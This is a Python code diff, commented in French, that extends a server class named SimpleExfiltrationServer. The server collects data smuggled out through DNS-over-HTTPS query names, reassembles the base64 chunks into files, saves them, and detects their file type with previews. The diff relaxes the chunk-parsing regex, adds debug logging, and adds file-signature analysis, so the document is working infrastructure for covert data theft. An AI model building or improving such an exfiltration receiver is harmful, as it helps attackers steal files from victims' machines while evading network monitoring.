@@ -16,8 +16,9 @@ from traffic_interceptor import DoHTrafficInterceptor
 
 # Configuration du logging
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    level=logging.DEBUG,  # Activer le debug
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    force=True  # Force la reconfiguration du logging
 )
 logger = logging.getLogger(__name__)
 
@@ -60,20 +61,28 @@ class SimpleExfiltrationServer:
             timestamp = query_data.get('timestamp', time.time())
             
             # Analyser le format: session_id-index-total-chunk.random.domain
+            logger.debug(f"🔍 Analyzing query name: {query_name}")
             parts = query_name.split('.')
             if len(parts) >= 2:
                 data_segment = parts[0]  # Premier segment avant le premier point
                 
                 # Parser le format: session_id-index-total-chunk
                 import re
-                pattern = re.compile(r"(\d+)-(\d{4})-(\d{4})-([a-zA-Z0-9_\-]+=*)")
+                # Pattern correct pour le format réel: timestamp-index-total-chunk
+                # Le chunk peut contenir des caractères base64 (lettres, chiffres, +, /, =, -, _)
+                pattern = re.compile(r"(\d+)-(\d+)-(\d+)-(.+)")
+                
+                # Debug : afficher les tentatives de matching
+                logger.debug(f"🔍 Tentative de parsing: '{data_segment}'")
                 match = pattern.match(data_segment)
                 
                 if match:
-                    session_id = match.group(1)  # Utiliser le vrai session ID, pas l'IP
+                    session_id = match.group(1)  # timestamp uniquement
                     index = int(match.group(2))
                     total = int(match.group(3))
-                    chunk = match.group(4)
+                    chunk = match.group(4)  # Données base64
+                    
+                    logger.debug(f"✅ Match réussi: session={session_id}, index={index}, total={total}, chunk={chunk[:10]}...")
                     
                     with self.session_lock:
                         if session_id not in self.sessions:
@@ -96,7 +105,21 @@ class SimpleExfiltrationServer:
                         logger.info(f"🔧 Reconstruction complète pour session {session_id} ({session['total_chunks']} chunks)")
                         self._try_reconstruct_session(session_id)
                 else:
-                    logger.warning(f"⚠️ Format de chunk non reconnu: {data_segment}")
+                    # Debug détaillé pour comprendre pourquoi ça ne marche pas
+                    logger.warning(f"⚠️ Format de chunk non reconnu 2: {data_segment}")
+                    logger.debug(f"🔧 Pattern utilisé: {pattern.pattern}")
+                    
+                    # Tentative de debug avec un pattern plus simple
+                    simple_pattern = re.compile(r"(\d+)-(\d+)-(\d+)-(.+)")
+                    simple_match = simple_pattern.match(data_segment)
+                    if simple_match:
+                        logger.debug(f"✅ Simple pattern match: {simple_match.groups()}")
+                    else:
+                        logger.debug(f"❌ Même le simple pattern ne fonctionne pas")
+                        
+                        # Afficher les caractères un par un pour diagnostiquer
+                        chars_debug = [f"{c}({ord(c)})" for c in data_segment[:50]]
+                        logger.debug(f"🔤 Caractères: {' '.join(chars_debug)}")
                 
         except Exception as e:
             logger.error(f"Erreur lors de l'extraction: {e}")
@@ -132,15 +155,15 @@ class SimpleExfiltrationServer:
                     with open(output_file, 'wb') as f:
                         f.write(reconstructed_data)
                     
+                    # Analyser le type de fichier et afficher l'aperçu approprié
+                    file_info = self._analyze_file_content(reconstructed_data)
+                    
                     logger.info(f"✅ Données reconstruites sauvées: {output_file}")
                     logger.info(f"📊 Taille: {len(reconstructed_data)} bytes")
+                    logger.info(f"� Type détecté: {file_info['type']}")
                     
-                    # Afficher un aperçu si c'est du texte
-                    try:
-                        preview = reconstructed_data[:200].decode('utf-8', errors='ignore')
-                        logger.info(f"📄 Aperçu: {preview}...")
-                    except:
-                        logger.info("📄 Données binaires détectées")
+                    # Afficher l'aperçu selon le type
+                    self._display_file_preview(reconstructed_data, file_info)
                     
                     # Nettoyer la session
                     del self.sessions[session_id]
@@ -200,8 +223,132 @@ class SimpleExfiltrationServer:
         except Exception as e:
             logger.warning(f"⚠️ Échec hex: {e}")
         
-        logger.error("❌ Aucun décodage réussi")
-        return None
+        # Si aucun décodage ne fonctionne, traiter comme données brutes
+        logger.warning("⚠️ Aucun décodage réussi, sauvegarde des données brutes")
+        return combined_data.encode('utf-8', errors='ignore')
+    
+    def _analyze_file_content(self, data):
+        """Analyse le contenu du fichier pour déterminer son type"""
+        if not data:
+            return {'type': 'empty', 'encoding': None}
+        
+        # Vérifier les signatures de fichiers (magic numbers)
+        signatures = {
+            b'\x89PNG\r\n\x1a\n': {'type': 'PNG Image', 'ext': '.png'},
+            b'\xff\xd8\xff': {'type': 'JPEG Image', 'ext': '.jpg'},
+            b'GIF8': {'type': 'GIF Image', 'ext': '.gif'},
+            b'%PDF': {'type': 'PDF Document', 'ext': '.pdf'},
+            b'PK\x03\x04': {'type': 'ZIP Archive', 'ext': '.zip'},
+            b'PK\x05\x06': {'type': 'ZIP Archive (empty)', 'ext': '.zip'},
+            b'\x50\x4b\x03\x04': {'type': 'ZIP/Office Document', 'ext': '.zip'},
+            b'\x1f\x8b\x08': {'type': 'GZIP Archive', 'ext': '.gz'},
+            b'BZ': {'type': 'BZIP2 Archive', 'ext': '.bz2'},
+            b'\x37\x7a\xbc\xaf\x27\x1c': {'type': '7ZIP Archive', 'ext': '.7z'},
+            b'Rar!\x1a\x07\x00': {'type': 'RAR Archive', 'ext': '.rar'},
+            b'\x00\x00\x01\x00': {'type': 'Windows Icon', 'ext': '.ico'},
+            b'RIFF': {'type': 'RIFF (Audio/Video)', 'ext': '.wav/.avi'},
+            b'\x49\x44\x33': {'type': 'MP3 Audio', 'ext': '.mp3'},
+            b'\x66\x74\x79\x70': {'type': 'MP4 Video', 'ext': '.mp4'},
+            b'\x00\x00\x00\x0c\x6a\x50\x20\x20': {'type': 'JPEG 2000', 'ext': '.jp2'},
+            b'\x89\x50\x4e\x47': {'type': 'PNG Image', 'ext': '.png'},
+            b'\x42\x4d': {'type': 'BMP Image', 'ext': '.bmp'},
+            b'\x52\x61\x72\x21': {'type': 'RAR Archive', 'ext': '.rar'},
+            b'\x7f\x45\x4c\x46': {'type': 'ELF Executable', 'ext': ''},
+            b'MZ': {'type': 'Windows Executable', 'ext': '.exe'},
+            b'\xca\xfe\xba\xbe': {'type': 'Java Class', 'ext': '.class'},
+            b'\xd0\xcf\x11\xe0': {'type': 'Microsoft Office', 'ext': '.doc/.xls'},
+        }
+        
+        # Vérifier les signatures
+        for signature, info in signatures.items():
+            if data.startswith(signature):
+                return {
+                    'type': info['type'],
+                    'extension': info['ext'],
+                    'encoding': 'binary'
+                }
+        
+        # Essayer de détecter du texte
+        try:
+            # Tenter UTF-8
+            text_content = data.decode('utf-8')
+            # Vérifier si c'est du texte lisible (pas trop de caractères de contrôle)
+            printable_ratio = sum(c.isprintable() or c.isspace() for c in text_content) / len(text_content)
+            
+            if printable_ratio > 0.8:  # 80% de caractères imprimables
+                # Détecter le type de texte
+                lower_content = text_content.lower()
+                if any(marker in lower_content for marker in ['<html', '<!doctype', '<xml']):
+                    return {'type': 'HTML/XML Document', 'encoding': 'utf-8', 'extension': '.html'}
+                elif any(marker in lower_content for marker in ['{', '}', '":', '[']):
+                    return {'type': 'JSON Data', 'encoding': 'utf-8', 'extension': '.json'}
+                elif any(marker in lower_content for marker in ['def ', 'import ', 'class ', 'print(']):
+                    return {'type': 'Python Code', 'encoding': 'utf-8', 'extension': '.py'}
+                elif any(marker in lower_content for marker in ['function', 'var ', 'const ', 'let ']):
+                    return {'type': 'JavaScript Code', 'encoding': 'utf-8', 'extension': '.js'}
+                elif any(marker in lower_content for marker in ['#!/bin/', '#include', 'int main']):
+                    return {'type': 'Source Code', 'encoding': 'utf-8', 'extension': '.c/.sh'}
+                else:
+                    return {'type': 'Plain Text', 'encoding': 'utf-8', 'extension': '.txt'}
+        except UnicodeDecodeError:
+            pass
+        
+        # Essayer d'autres encodages
+        for encoding in ['latin-1', 'cp1252', 'ascii']:
+            try:
+                text_content = data.decode(encoding)
+                printable_ratio = sum(c.isprintable() or c.isspace() for c in text_content) / len(text_content)
+                if printable_ratio > 0.8:
+                    return {'type': f'Text ({encoding})', 'encoding': encoding, 'extension': '.txt'}
+            except:
+                continue
+        
+        # Par défaut, considérer comme binaire
+        return {'type': 'Binary Data', 'encoding': 'binary', 'extension': '.bin'}
+    
+    def _display_file_preview(self, data, file_info):
+        """Affiche un aperçu approprié selon le type de fichier"""
+        try:
+            if file_info['encoding'] == 'binary':
+                # Affichage hexadécimal pour les fichiers binaires
+                hex_preview = data[:64].hex()
+                formatted_hex = ' '.join(hex_preview[i:i+2] for i in range(0, len(hex_preview), 2))
+                logger.info(f"📄 Aperçu hexadécimal: {formatted_hex}...")
+                
+                # Essayer d'afficher des caractères ASCII visibles
+                ascii_preview = ''
+                for byte in data[:64]:
+                    if 32 <= byte <= 126:  # Caractères ASCII imprimables
+                        ascii_preview += chr(byte)
+                    else:
+                        ascii_preview += '.'
+                
+                if ascii_preview.strip('.'):
+                    logger.info(f"📄 Aperçu ASCII: {ascii_preview}")
+                
+            else:
+                # Affichage texte pour les fichiers texte
+                text_content = data.decode(file_info['encoding'], errors='ignore')
+                
+                # Limiter l'aperçu et nettoyer
+                preview_lines = text_content[:500].split('\n')[:10]
+                clean_preview = '\n'.join(line.strip() for line in preview_lines if line.strip())
+                
+                logger.info(f"📄 Aperçu texte:")
+                for i, line in enumerate(clean_preview.split('\n')[:5]):
+                    if line:
+                        logger.info(f"   {i+1}: {line[:80]}{'...' if len(line) > 80 else ''}")
+                
+                # Statistiques pour les fichiers texte
+                lines_count = len(text_content.split('\n'))
+                words_count = len(text_content.split())
+                logger.info(f"📊 Statistiques: {lines_count} lignes, {words_count} mots")
+                
+        except Exception as e:
+            logger.warning(f"⚠️ Erreur affichage aperçu: {e}")
+            # Aperçu basique en cas d'erreur
+            basic_preview = str(data[:100])[:100]
+            logger.info(f"📄 Aperçu basique: {basic_preview}...")
     
     def start(self):
         """Démarre le serveur de capture"""
